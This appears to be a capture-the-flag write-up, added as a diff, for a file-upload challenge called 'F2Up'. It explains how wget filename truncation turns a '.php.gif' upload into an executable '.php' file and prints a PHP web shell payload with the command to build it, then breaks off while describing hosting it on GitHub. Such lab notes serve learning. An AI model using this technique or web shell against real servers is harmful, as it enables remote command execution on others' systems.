@@ -1,0 +1,64 @@
+
+some info. about the challenge\\
+please give me hints and steps to exploit this challenge
+
+Challenge Name:  F2Up
+Challenge Description: this is the most secure way to file upload is it ?
+Level: medium
+
+
+
+
+ <form action="wget.php" method="POST">
+  <input type="text" name="url" class="url-input" value="http://bit.ly/2GAv9oF">
+ </form>
+ 
+ 
+ 
+ The Core Vulnerability: wget Filename Truncation
+ if you ask it to download a file with a very long filename (over 236 characters), 
+ wget will cut the name and save the file with the shortened version.
+ 
+The filename needs to be constructed very precisely:
+	 -    It must be longer than 236 characters.
+	 -    The first 232 characters can be anything (e.g., the letter "A").
+	 -    The next 4 characters must be .php.
+	 -    The final characters must be a valid image extension that the server allows, such as .gif. 
+	 -    the file looks like:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....(232 A's)....AAAA.php.gif 
+
+
+
+
+1- the filter will check from the last extension of the file .gif, this means we bypass the filter
+   but we can not execute it as php filters, so ..
+
+2- wget will cut the name of the name of the file to be make it 236
+   after cutting, the file will be like the following:  Ax232.php
+
+3- now there is a php file on the server and we can use this file to perform instruction on
+   the server ...
+
+
+4- now we need to write a payload in this file. you can do that like the following
+  $ echo '<?php echo system($_GET["cmd"]); ?>' > $(printf 'A'%.0s {1..232}).php.gif
+
+	 _____________________________________________________________________________
+	|									      |
+	| printf 'A'%.0s 1 2 3							      |
+	| - Takes the number 1 → prints A → prints 0 characters of 1 → output: A      |
+	| - Takes the number 2 → prints A → prints 0 characters of 2 → output: AA     |
+	| - Takes the number 3 → prints A → prints 0 characters of 3 → output: AAA    |
+	|_____________________________________________________________________________|
+
+
+	- $_GET is a superglobal array in PHP that contains parameters sent via the URL query string. 
+	  Example URL: http://Public-IP/Ax232.php?cmd=ls
+
+
+
+5- now we need to upload this file into a pubic IP, I will upload it into Github
+	- go to ur github
+	- $ mkdir f2up-challenge
+      
+   
+
